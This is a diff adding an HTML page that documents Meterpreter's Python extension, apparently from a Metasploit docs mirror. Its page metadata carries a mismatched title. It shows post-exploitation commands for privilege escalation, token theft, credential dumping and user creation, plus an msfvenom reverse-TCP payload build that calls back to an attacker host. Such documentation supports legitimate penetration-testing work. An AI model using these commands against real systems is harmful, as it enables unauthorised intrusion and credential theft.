@@ -1,0 +1,838 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.6.1 -->
+<title>Git Reference Sites | Metasploit spike</title>
+<meta name="generator" content="Jekyll v4.0.0" />
+<meta property="og:title" content="Git Reference Sites" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Learning Git" />
+<meta property="og:description" content="Learning Git" />
+<link rel="canonical" href="/metasploit-framework/articles/Git-Reference-Sites.html" />
+<meta property="og:url" content="/metasploit-framework/articles/Git-Reference-Sites.html" />
+<meta property="og:site_name" content="Metasploit spike" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2012-01-12T17:14:28+00:00" />
+<script type="application/ld+json">
+{"description":"Learning Git","headline":"Git Reference Sites","dateModified":"2012-01-12T17:14:28+00:00","datePublished":"2012-01-12T17:14:28+00:00","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"/metasploit-framework/articles/Git-Reference-Sites.html"},"url":"/metasploit-framework/articles/Git-Reference-Sites.html","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/metasploit-framework/assets/main.css"><link type="application/atom+xml" rel="alternate" href="/metasploit-framework/feed.xml" title="Metasploit spike" /></head>
+<body><header class="site-header" role="banner">
+
+    <div class="wrapper"><a class="site-title" rel="author" href="/metasploit-framework/">Metasploit spike</a><nav class="site-nav">
+          <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+          <label for="nav-trigger">
+            <span class="menu-icon">
+              <svg viewBox="0 0 18 15" width="18px" height="15px">
+                <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+              </svg>
+            </span>
+          </label>
+  
+          <div class="trigger">
+            <a class="page-link" href="/metasploit-framework/">Articles</a><a class="page-link" href="/metasploit-framework/modules/">Modules</a></div>
+        </nav></div>
+  </header>
+  <main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">Python Extension</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2016-02-02T22:02:57+00:00" itemprop="datePublished">Feb 2, 2016
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <h1 id="introduction">Introduction</h1>
+
+<p>For quite some time, Meterpreter users have wanted the ability to run arbitrary scripts under the context of a session on the target machine. While Railgun gives coders the ability to execute arbitrary Win32 API calls, it doesn’t really give them the ability to script the client in a single-shot.</p>
+
+<p>Meterpreter now has a new extension that aims to solve this problem by providing a completely in-memory Python interpreter that can load scripts, run ad-hoc python commands, and also provides bindings to Meterpreter itself. The extension comes with many (but not <em>all</em>) of the built-in functionality you would expect to see in a running Python interpreter. This includes the likes of <code class="highlighter-rouge">ctypes</code> for easy automation of Win32-related functions. We’ve even taken steps to make this extension piggy-back onto <code class="highlighter-rouge">metsrv</code>’s copy of the SSL libraries in an effort to reduce the size of the resulting binary.</p>
+
+<p>This page aims to document the features, show examples of how it can be used, and answer a few common questions that come up.</p>
+
+<p>Unfortunately, at this point in time the extension only works inside x86 and x64 Meterpreters running on Windows targets. However, there are plans to enable this functionality on other implementations over time.</p>
+
+<h1 id="usage">Usage</h1>
+
+<p>As with any other extension that comes with Meterpreter, loading it is very simple:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; use python
+Loading extension python...success.
+</code></pre></div></div>
+<p>Once loaded, the help system shows the commands that come with the extension:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; help
+
+    ... snip ...
+
+Python Commands
+===============
+
+    Command         Description
+    -------         -----------
+    python_execute  Execute a python command string
+    python_import   Import/run a python file or module
+    python_reset    Resets/restarts the Python interpreter
+</code></pre></div></div>
+
+<p>Each of these commands is discussed in detail below.</p>
+
+<h2 id="python_execute">python_execute</h2>
+
+<p>The <code class="highlighter-rouge">python_execute</code> command is the simplest of all commands that come with the extension, and provides the means to run single-shot lines of Python code, much in the same way that the normal Python interpreter functions from the command-line when using the <code class="highlighter-rouge">-c</code> switch. The full help for the command is as follows:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; python_execute -h
+Usage: python_execute &lt;python code&gt; [-r result var name]
+
+Runs the given python string on the target. If a result is required,
+it should be stored in a python variable, and that variable should
+passed using the -r parameter.
+
+OPTIONS:
+
+    -h        Help banner
+    -r &lt;opt&gt;  Name of the variable containing the result (optional)
+</code></pre></div></div>
+<p>A very simple example of this command is shown below:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; python_execute "print 'Hi, from Meterpreter!'"
+[+] Content written to stdout:
+Hi, from Meterpreter!
+</code></pre></div></div>
+<p>Notice that any output that is written to stdout is captured by Meterpreter and returned to Metasploit so that it’s visible to the user. This also happens for anything written to stderr, as shown below:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; python_execute "x = x + 1"
+[-] Content written to stderr:
+Traceback (most recent call last):
+  File "&lt;string&gt;", line 1, in &lt;module&gt;
+NameError: name 'x' is not defined
+</code></pre></div></div>
+<p>This handy feature now only allows users to see the output of their scripts, but it also means that any errors are completely visible too.</p>
+
+<p>A more interesting example can be seen below:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; python_execute "x = [y for y in range(0, 20) if y % 5 == 0]"
+[+] Command executed without returning a result
+</code></pre></div></div>
+<p>The command above executes, but nothing was printed to stdout, or to stderr, and hence nothing was captured.</p>
+
+<p>The good thing is that the Python extension is persistant across calls. This means that after the above command is executed, <code class="highlighter-rouge">x</code> is still present in the interpreter and can be accessed with another call:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; python_execute "print x"
+[+] Content written to stdout:
+[0, 5, 10, 15]
+</code></pre></div></div>
+<p>As useful as this is, developers may want to produce post-modules that make use of the data that a Python script has generated. Parsing stdout is not ideal in such a scenario, and hence this command provides the means for individual variables to be extracted directly using the <code class="highlighter-rouge">-r</code> paramter, as described by the help:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; python_execute "x = [y for y in range(0, 20) if y % 5 == 0]" -r x
+[+] x = [0, 5, 10, 15]
+</code></pre></div></div>
+<p>Note that this command requires the first parameter to be a string that contains code that needs to be executed. However, this string can be blank, resulting in no code being executed. This means that extraction of content generated in previous calls is still possible without executing more code, or rerunning previous code snippets just to make use of the <code class="highlighter-rouge">-r</code> parameter:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; python_execute "" -r x
+[+] x = [0, 5, 10, 15]
+</code></pre></div></div>
+<p>Behind the scenes, the result of the execution is a Ruby hash that contains all content written to stdout and stderr, and the content of the variable chosen using the <code class="highlighter-rouge">-r</code> parameter.</p>
+
+<p>Sometimes, single-line execution isn’t enough, or is cumbersome. The <code class="highlighter-rouge">python_import</code> command is provided to solve this problem and allow for scripts and modules to be loaded into the target from disk.</p>
+
+<h2 id="python_import">python_import</h2>
+
+<p>This command allows for whole modules to be loaded from the attacker’s machine an uploaded to the target interpreter. The full help is shown below:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; python_import -h
+Usage: python_import &lt;-f file path&gt; [-n mod name] [-r result var name]
+
+Loads a python code file or module from disk into memory on the target.
+The module loader requires a path to a folder that contains the module,
+and the folder name will be used as the module name. Only .py files will
+work with modules.
+
+OPTIONS:
+
+    -f &lt;opt&gt;  Path to the file (.py, .pyc), or module directory to import
+    -h        Help banner
+    -n &lt;opt&gt;  Name of the module (optional, for single files only)
+    -r &lt;opt&gt;  Name of the variable containing the result (optional, single files only)
+</code></pre></div></div>
+<p>Importing of module trees is still considered a <em>beta</em> feature, but we encourage you to use it where possible and keep us informed of any issues you may face.</p>
+
+<p>Consider the following script:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cat /tmp/drives.py
+import string
+from ctypes import windll
+
+def get_drives():
+    drives = []
+    bitmask = windll.kernel32.GetLogicalDrives()
+    for letter in string.uppercase:
+        if bitmask &amp; 1:
+            drives.append(letter)
+        bitmask &gt;&gt;= 1
+
+    return drives
+
+result = get_drives()
+print result
+</code></pre></div></div>
+<p>The aim of this is to determine all the local logical drives and put the letters into a list. From there it prints that list to screen. The result of running the script is as follows:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; python_import -f /tmp/drives.py
+[*] Importing /tmp/drives.py ...
+[+] Content written to stdout:
+['A', 'C', 'D', 'Z']
+</code></pre></div></div>
+<p>This shows that <code class="highlighter-rouge">ctypes</code> does indeed function correctly!</p>
+
+<p>This command is also intended to allow for recursive loading of modules from the local attacker file system, however this feature is still not yet ready for prime time and work is still actively being done on this area.</p>
+
+<h2 id="python_reset">python_reset</h2>
+
+<p>It may get to a point where the content of the interpreter needs to be flushed. The <code class="highlighter-rouge">python_reset</code> command clears out all imports, libraries and global variables:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; python_execute "x = 100"
+[+] Command executed without returning a result
+meterpreter &gt; python_execute "print x"
+[+] Content written to stdout:
+100
+
+meterpreter &gt; python_reset
+[+] Python interpreter successfully reset
+meterpreter &gt; python_execute "print x"
+[-] Content written to stderr:
+Traceback (most recent call last):
+  File "&lt;string&gt;", line 1, in &lt;module&gt;
+NameError: name 'x' is not defined
+</code></pre></div></div>
+
+<h2 id="meterpreter-bindings">Meterpreter Bindings</h2>
+
+<p>A number of bindings are available to the Python extension that allow for interaction with the Meterpreter instance itself. They are broken up into logical modules based on the functionality that they provide. Bindings are available for other extensions as well, and hence in order to use them, those extensions must be loaded. If an extension is not present, and error is thrown. As soon as an extension is loaded, the function should work. Each of the following subsections shows a module namespace that must be imported for that module to function correctly.</p>
+
+<h3 id="binding-list">Binding list</h3>
+
+<h4 id="meterpreterelevate">meterpreter.elevate</h4>
+
+<ul>
+  <li><code class="highlighter-rouge">meterpreter.elevate.getsystem()</code> - maps directly to the <code class="highlighter-rouge">getsystem</code> command, however only attempts to use technique <code class="highlighter-rouge">1</code> because this is the only technique that doesn’t require a binary to be uploaded.</li>
+  <li><code class="highlighter-rouge">meterpreter.elevate.rev2self()</code> - maps directly to the <code class="highlighter-rouge">rev2self</code> command.</li>
+  <li><code class="highlighter-rouge">meterpreter.elevate.steal_token(pid)</code> - provides the ability to steal a token from another process.
+    <ul>
+      <li><code class="highlighter-rouge">pid</code> - the identifier of the process to steal the token from.</li>
+    </ul>
+  </li>
+  <li><code class="highlighter-rouge">meterpreter.elevate.drop_token()</code> - drops the token that was stolen using <code class="highlighter-rouge">steal_token</code>.</li>
+</ul>
+
+<h4 id="meterpreterextapi-requires-the-extapi-extension">meterpreter.extapi (requires the extapi extension)</h4>
+
+<p>Each of the following functions takes the following parameters:</p>
+
+<ul>
+  <li><code class="highlighter-rouge">domain_name</code> - the name of the domain that will be enumerated.</li>
+  <li><code class="highlighter-rouge">max_results</code> - maximum number of results (default <code class="highlighter-rouge">None</code>).</li>
+  <li><code class="highlighter-rouge">page_size</code> - the size of the results page (default <code class="highlighter-rouge">None</code>).</li>
+</ul>
+
+<p>The full list of available functions is as follows:</p>
+
+<ul>
+  <li><code class="highlighter-rouge">meterpreter.extapi.adsi.enum_dcs(domain_name, max_results, page_size)</code> - enumerate the domain controllers on the given domain.</li>
+  <li><code class="highlighter-rouge">meterpreter.extapi.adsi.enum_users(domain_name, max_results, page_size)</code> - enumerate users on the given domain.</li>
+  <li><code class="highlighter-rouge">meterpreter.extapi.adsi.enum_group_users_nested(domain_name, group_dn, max_results, page_size)</code> - enumerate users in the given group recursively.
+    <ul>
+      <li><code class="highlighter-rouge">group_dn</code> - The distinguished name of the group to enumerate.</li>
+    </ul>
+  </li>
+  <li><code class="highlighter-rouge">meterpreter.extapi.adsi.enum_computers(domain_name, max_results, page_size)</code> - enumerate computers on the given domain.</li>
+  <li><code class="highlighter-rouge">meterpreter.extapi.adsi.domain_query(domain_name, query_filter, fields, max_results, page_size)</code> - provides a generic query mechanism to ADSI. All other functions in this library make use of this function.
+    <ul>
+      <li><code class="highlighter-rouge">query_filter</code> - the LDAP-formatted query filter for the query.</li>
+      <li><code class="highlighter-rouge">fields</code> - list of fields to extract from the query results.</li>
+    </ul>
+  </li>
+</ul>
+
+<h4 id="meterpreterfs">meterpreter.fs</h4>
+
+<ul>
+  <li><code class="highlighter-rouge">meterpreter.fs.show_mount()</code> - maps to the <code class="highlighter-rouge">show_mount</code> command and lists all logical drives on the target.</li>
+</ul>
+
+<h4 id="meterpreterincognito-requires-the-incognito-extension">meterpreter.incognito (requires the incognito extension)</h4>
+
+<ul>
+  <li><code class="highlighter-rouge">meterpreter.incognito.list_user_tokens()</code> - list all available user tokens.</li>
+  <li><code class="highlighter-rouge">meterpreter.incognito.list_group_tokens()</code> - list all available group tokens.</li>
+  <li><code class="highlighter-rouge">meterpreter.incognito.impersonate(user)</code> - impersonate the given user.
+    <ul>
+      <li><code class="highlighter-rouge">user</code> - name of the user/group to impersonate in <code class="highlighter-rouge">DOMAIN\user</code> format.</li>
+    </ul>
+  </li>
+  <li><code class="highlighter-rouge">meterpreter.incognito.snarf_hashes(server)</code> - run the <code class="highlighter-rouge">snarf_hashes</code> functionality using the specified server.
+    <ul>
+      <li><code class="highlighter-rouge">server</code> - name of the server that is in place and ready to snarf the hashes.</li>
+    </ul>
+  </li>
+  <li><code class="highlighter-rouge">meterpreter.incognito.add_user(server, username, password)</code> - add a user to the given server.
+    <ul>
+      <li><code class="highlighter-rouge">server</code> - name of the server to use when adding the user.</li>
+      <li><code class="highlighter-rouge">username</code> - name of the user to create.</li>
+      <li><code class="highlighter-rouge">password</code> - password for the new user.</li>
+    </ul>
+  </li>
+  <li><code class="highlighter-rouge">meterpreter.incognito.add_group_user(server, group, username)</code> - add a user to a group (domain).
+    <ul>
+      <li><code class="highlighter-rouge">server</code> - name of the server to use when adding the user to a group.</li>
+      <li><code class="highlighter-rouge">group</code> - name of the group to add the user to.</li>
+      <li><code class="highlighter-rouge">username</code> - name of the user to add to the group.</li>
+    </ul>
+  </li>
+  <li><code class="highlighter-rouge">meterpreter.incognito.add_localgroup_user(server, group, username)</code> - add a user to a group (local).
+    <ul>
+      <li><code class="highlighter-rouge">server</code> - name of the server to use when adding the user to a group.</li>
+      <li><code class="highlighter-rouge">group</code> - name of the group to add the user to.</li>
+      <li><code class="highlighter-rouge">username</code> - name of the user to add to the group.</li>
+    </ul>
+  </li>
+</ul>
+
+<h4 id="meterpreterkiwi-requires-the-kiwi-extension">meterpreter.kiwi (requires the kiwi extension)</h4>
+
+<ul>
+  <li><code class="highlighter-rouge">meterpreter.kiwi.creds_all()</code> - matches the <code class="highlighter-rouge">creds_all</code> command from the kiwi extension and returns a full list of all credentials that can be pulled from memory.</li>
+</ul>
+
+<h4 id="meterpretersys">meterpreter.sys</h4>
+
+<ul>
+  <li><code class="highlighter-rouge">meterpreter.sys.info()</code> - matches the <code class="highlighter-rouge">sysinfo</code> command and shows system information.</li>
+  <li><code class="highlighter-rouge">meterpreter.sys.ps_list()</code> - matches the <code class="highlighter-rouge">ps</code> command and lists the processes on the target.</li>
+</ul>
+
+<h4 id="meterpretertransport">meterpreter.transport</h4>
+
+<ul>
+  <li><code class="highlighter-rouge">meterpreter.transport.list()</code> - list all transports in the target.</li>
+  <li><code class="highlighter-rouge">meterpreter.transport.add(url, session_expiry, comm_timeout, retry_total, retry_wait, ua, proxy_host, proxy_user, proxy_pass, cert_hash)</code> - allows for transports to be added to the Meterpreter session. All but the <code class="highlighter-rouge">url</code> parameter come with a sane default. Full details of each of these parameters can be found in the <a href="https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Transport-Control">transport</a> documentation.</li>
+</ul>
+
+<p>It is not possible to delete transports using the python extension as this opens the door to many kinds of failure.</p>
+
+<h4 id="meterpreteruser">meterpreter.user</h4>
+
+<ul>
+  <li><code class="highlighter-rouge">meterpreter.user.getuid()</code> - gets the UID of the current session.</li>
+  <li><code class="highlighter-rouge">meterpreter.user.getsid()</code> - gets the SID of the current session.</li>
+  <li><code class="highlighter-rouge">meterpreter.user.is_system()</code> - determines if the current session is running as the <code class="highlighter-rouge">SYSTEM</code> user.</li>
+</ul>
+
+<h3 id="bindings-example">Bindings example</h3>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; getuid
+Server username: WIN-TV01I7GG7JK\oj
+meterpreter &gt; python_execute "import meterpreter.user; print meterpreter.user.getuid()"
+[+] Content written to stdout:
+WIN-TV01I7GG7JK\oj
+
+meterpreter &gt; python_execute "import meterpreter.elevate; meterpreter.elevate.getsystem()"
+[+] Command executed without returning a result
+meterpreter &gt; getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter &gt; python_execute "meterpreter.elevate.rev2self(); print meterpreter.user.getuid()"
+[+] Content written to stdout:
+WIN-TV01I7GG7JK\oj
+
+meterpreter &gt; use incognito
+Loading extension incognito...success.
+meterpreter &gt; python_execute "import meterpreter.incognito; print meterpreter.incognito.list_user_tokens()"
+[+] Content written to stdout:
+{'Delegation': ['NT AUTHORITY\\LOCAL SERVICE', 'NT AUTHORITY\\NETWORK SERVICE', 'NT AUTHORITY\\SYSTEM', 'WIN-TV01I7GG7JK\\oj'], 'Impersonation': ['NT AUTHORITY\\ANONYMOUS LOGON']}
+
+meterpreter &gt; python_execute "import meterpreter.fs; print meterpreter.fs.show_mount()"
+[+] Content written to stdout:
+[{'Name': 'A:\\', 'SpaceUser': None, 'SpaceTotal': None, 'UNC': None, 'SpaceFree': None, 'Type': 2}, {'Name': 'C:\\', 'SpaceUser': 28950585344L, 'SpaceTotal': 64422408192L, 'UNC': None, 'SpaceFree': 28950585344L, 'Type': 3}, {'Name': 'D:\\', 'SpaceUser': None, 'SpaceTotal': None, 'UNC': None, 'SpaceFree': None, 'Type': 5}]
+</code></pre></div></div>
+<p>Each of the examples above just show the results printed to stdout, however the values are returned as Python dictionaries and can be operated on just like normal variables.</p>
+
+<h2 id="stageless-initialisation">Stageless Initialisation</h2>
+
+<p>Not only can the extension be baked into a stageless Meterpreter, like any other extension, it also has the ability to run an arbitrary script before the Meterpreter session is even established! Consider the following script:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$  cat /tmp/met.py
+import meterpreter.transport
+meterpreter.transport.add("tcp://127.0.0.1:8000")
+</code></pre></div></div>
+<p>This is a simple script that uses the Meterpreter bindings to add a new transport to the list of transports. This is executed immediately before Meterpreter attempts to create a connection back to Metasploit for the first time. The intent is to show that it’s possible to add any number of transports on startup.</p>
+
+<p>To create a stageless payload that uses this script, we can make use of the <code class="highlighter-rouge">EXTINIT</code> parameter in <code class="highlighter-rouge">msfvenom</code>:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ msfvenom -p windows/meterpreter_reverse_tcp LHOST=172.16.52.1 LPORT=4445 EXTENSIONS=stdapi,priv,python EXTINIT=python,/tmp/met.py -f exe -o /tmp/met-stageless.exe
+No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+No Arch selected, selecting Arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 6412437 bytes
+Saved as: /tmp/met-stageless.exe
+</code></pre></div></div>
+<p>When this payload is executed, the transport is added and shown to be present in the transport list immediately:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf exploit(handler) &gt; [*] Meterpreter session 2 opened (172.16.52.1:4445 -&gt; 172.16.52.247:49159) at 2015-12-13 11:06:54 +1000
+
+msf exploit(handler) &gt; sessions -i -1
+[*] Starting interaction with 2...
+
+meterpreter &gt; transport list
+Session Expiry  : @ 2015-12-20 11:06:52
+
+    ID  Curr  URL                     Comms T/O  Retry Total  Retry Wait
+    --  ----  ---                     ---------  -----------  ----------
+    1         tcp://127.0.0.1:8000    300        3600         10
+    2   *     tcp://172.16.52.1:4445  300        3600         10
+</code></pre></div></div>
+<p>This stageless initialisation feature allows for long-running Python scripts to be run before Meterpreter even calls home. This is really handy in so many ways, so get creative and show us how awesome this can be.</p>
+
+<h1 id="faq">FAQ</h1>
+
+<blockquote>
+  <p>Does the extension do dynamic resolution of Python libraries at runtime?</p>
+</blockquote>
+
+<p>Yes. The extension has a built-in import handler that loads modules from memory. This includes modules that the user has dynamically loaded using the <code class="highlighter-rouge">python_import</code> command. If a module doesn’t exist as part of the extension then resolution will fail. Down the track we may look into extending this feature so that missing libraries are uploaded on-the-fly when an import fails, but it’s not known when this work will get done.</p>
+
+<blockquote>
+  <p>When will this extension be available for other Meterpreters?</p>
+</blockquote>
+
+<p>We’re not yet able to put a timeline on this.</p>
+
+<blockquote>
+  <p>Is it possible to use the Python extension to run Responder?</p>
+</blockquote>
+
+<p>Unfortunately, no it is not. Responder makes the assumption that port <code class="highlighter-rouge">445</code> is available for use on the target, which is why it functions nicely on *nix systems that don’t make use of this port by default. On Windows systems, port <code class="highlighter-rouge">445</code> is already in use by system services and hence can’t be bound to.</p>
+
+<p>There is a Powershell-based project that aims to do the same thing as Responder, and that is called <a href="https://github.com/Kevin-Robertson/Inveigh">Inveigh</a>. This utility piggy-backs of the existing SMB service, and appears to do quite a good job of stealing hashes, so it’s recommended that this be used instead.</p>
+
+<blockquote>
+  <p>Is it perfect?</p>
+</blockquote>
+
+<p>Hell no! But the goal is to get closer and closer to perfect as we go. It’s up to you to help us improve it along the way by using it in interesting ways, and submitting bugs when it breaks.</p>
+
+<blockquote>
+  <p>Can I suggest a feature?</p>
+</blockquote>
+
+<p>Please do, making good use of the Github issues feature. Better still, create a PR for one!</p>
+
+<h1 id="currently-loadable-native-libraries">Currently Loadable Native Libraries</h1>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>__future__
+__phello__
+_abcoll
+_osx_support
+_pyio
+_strptime
+_threading_local
+_weakrefset
+abc
+aifc
+antigravity
+argparse
+asynchat
+asyncore
+atexit
+audiodev
+base64
+BaseHTTPServer
+Bastion
+bdb
+binhex
+bisect
+calendar
+cgi
+CGIHTTPServer
+cgitb
+chunk
+cmd
+code
+codecs
+codeop
+collections
+colorsys
+commands
+compileall
+compiler
+compiler.ast
+compiler.consts
+compiler.future
+compiler.misc
+compiler.pyassem
+compiler.pycodegen
+compiler.symbols
+compiler.syntax
+compiler.transformer
+compiler.visitor
+ConfigParser
+contextlib
+Cookie
+cookielib
+copy
+copy_reg
+cProfile
+csv
+ctypes
+ctypes._endian
+ctypes.util
+ctypes.wintypes
+decimal
+difflib
+dircache
+dis
+DocXMLRPCServer
+dummy_thread
+dummy_threading
+email
+email._parseaddr
+email.base64mime
+email.charset
+email.encoders
+email.errors
+email.feedparser
+email.generator
+email.header
+email.iterators
+email.message
+email.parser
+email.quoprimime
+email.utils
+email.mime
+email.mime.application
+email.mime.audio
+email.mime.base
+email.mime.image
+email.mime.message
+email.mime.multipart
+email.mime.nonmultipart
+email.mime.text
+encodings
+encodings.aliases
+encodings.ascii
+encodings.base64_codec
+encodings.charmap
+encodings.cp037
+encodings.cp1006
+encodings.cp1026
+encodings.cp1140
+encodings.cp1250
+encodings.cp1251
+encodings.cp1252
+encodings.cp1253
+encodings.cp1254
+encodings.cp1255
+encodings.cp1256
+encodings.cp1257
+encodings.cp1258
+encodings.cp424
+encodings.cp437
+encodings.cp500
+encodings.cp720
+encodings.cp737
+encodings.cp775
+encodings.cp850
+encodings.cp852
+encodings.cp855
+encodings.cp856
+encodings.cp857
+encodings.cp858
+encodings.cp860
+encodings.cp861
+encodings.cp862
+encodings.cp863
+encodings.cp864
+encodings.cp865
+encodings.cp866
+encodings.cp869
+encodings.cp874
+encodings.cp875
+encodings.hex_codec
+encodings.hp_roman8
+encodings.idna
+encodings.iso8859_1
+encodings.iso8859_10
+encodings.iso8859_11
+encodings.iso8859_13
+encodings.iso8859_14
+encodings.iso8859_15
+encodings.iso8859_16
+encodings.iso8859_2
+encodings.iso8859_3
+encodings.iso8859_4
+encodings.iso8859_5
+encodings.iso8859_6
+encodings.iso8859_7
+encodings.iso8859_8
+encodings.iso8859_9
+encodings.koi8_r
+encodings.koi8_u
+encodings.latin_1
+encodings.mac_arabic
+encodings.mac_centeuro
+encodings.mac_croatian
+encodings.mac_cyrillic
+encodings.mac_farsi
+encodings.mac_greek
+encodings.mac_iceland
+encodings.mac_latin2
+encodings.mac_roman
+encodings.mac_romanian
+encodings.mac_turkish
+encodings.mbcs
+encodings.palmos
+encodings.ptcp154
+encodings.punycode
+encodings.quopri_codec
+encodings.raw_unicode_escape
+encodings.rot_13
+encodings.string_escape
+encodings.tis_620
+encodings.undefined
+encodings.unicode_escape
+encodings.unicode_internal
+encodings.utf_16
+encodings.utf_16_be
+encodings.utf_16_le
+encodings.utf_32
+encodings.utf_32_be
+encodings.utf_32_le
+encodings.utf_7
+encodings.utf_8
+encodings.utf_8_sig
+encodings.uu_codec
+encodings.zlib_codec
+filecmp
+fileinput
+fnmatch
+formatter
+fpformat
+fractions
+ftplib
+functools
+genericpath
+getopt
+getpass
+gettext
+glob
+gzip
+hashlib
+heapq
+hmac
+htmlentitydefs
+htmllib
+HTMLParser
+httplib
+ihooks
+imaplib
+imghdr
+importlib
+imputil
+inspect
+io
+json
+json.decoder
+json.encoder
+json.scanner
+json.tool
+keyword
+linecache
+locale
+logging
+logging.config
+logging.handlers
+macpath
+macurl2path
+mailbox
+mailcap
+markupbase
+md5
+meterpreter
+meterpreter.core
+meterpreter.elevate
+meterpreter.fs
+meterpreter.incognito
+meterpreter.kiwi
+meterpreter.sys
+meterpreter.tlv
+meterpreter.transport
+meterpreter.user
+meterpreter.extapi
+meterpreter.extapi.adsi
+mhlib
+mimetools
+mimetypes
+MimeWriter
+modulefinder
+multifile
+multiprocessing
+multiprocessing.connection
+multiprocessing.forking
+multiprocessing.heap
+multiprocessing.managers
+multiprocessing.pool
+multiprocessing.process
+multiprocessing.queues
+multiprocessing.reduction
+multiprocessing.sharedctypes
+multiprocessing.synchronize
+multiprocessing.util
+multiprocessing.dummy
+multiprocessing.dummy.connection
+mutex
+netrc
+new
+nntplib
+ntpath
+nturl2path
+numbers
+opcode
+optparse
+os
+os2emxpath
+pdb
+pickle
+pickletools
+pipes
+pkgutil
+platform
+plistlib
+popen2
+poplib
+posixfile
+posixpath
+pprint
+profile
+pstats
+py_compile
+pyclbr
+pydoc
+Queue
+quopri
+random
+re
+repr
+rexec
+rfc822
+rlcompleter
+robotparser
+runpy
+sched
+sets
+sgmllib
+sha
+shelve
+shlex
+shutil
+SimpleHTTPServer
+SimpleXMLRPCServer
+site
+smtplib
+sndhdr
+socket
+SocketServer
+sre
+sre_compile
+sre_constants
+sre_parse
+ssl
+stat
+statvfs
+string
+StringIO
+stringold
+stringprep
+struct
+subprocess
+sunau
+sunaudio
+symbol
+symtable
+sysconfig
+tabnanny
+tarfile
+telnetlib
+tempfile
+textwrap
+this
+threading
+timeit
+toaiff
+token
+tokenize
+trace
+traceback
+types
+urllib
+urllib2
+urlparse
+user
+UserDict
+UserList
+UserString
+uu
+uuid
+warnings
+wave
+weakref
+webbrowser
+whichdb
+wsgiref
+wsgiref.handlers
+wsgiref.headers
+wsgiref.simple_server
+wsgiref.util
+wsgiref.validate
+xdrlib
+xml
+xml.dom
+xml.dom.domreg
+xml.dom.expatbuilder
+xml.dom.minicompat
+xml.dom.minidom
+xml.dom.NodeFilter
+xml.dom.pulldom
+xml.dom.xmlbuilder
+xml.etree
+xml.etree.ElementInclude
+xml.etree.ElementPath
+xml.etree.ElementTree
+xml.parsers
+xml.sax
+xml.sax._exceptions
+xml.sax.handler
+xml.sax.saxutils
+xml.sax.xmlreader
+xmllib
+xmlrpclib
+zipfile
+</code></pre></div></div>
+
+  </div><a class="u-url" href="/metasploit-framework/articles/Python-Extension.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/metasploit-framework/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">Metasploit spike</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">Metasploit spike</li><li><a class="u-email" href="mailto:your-email@example.com">your-email@example.com</a></li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/jekyll"><svg class="svg-icon"><use xlink:href="/metasploit-framework/assets/minima-social-icons.svg#github"></use></svg> <span class="username">jekyll</span></a></li><li><a href="https://www.twitter.com/jekyllrb"><svg class="svg-icon"><use xlink:href="/metasploit-framework/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">jekyllrb</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
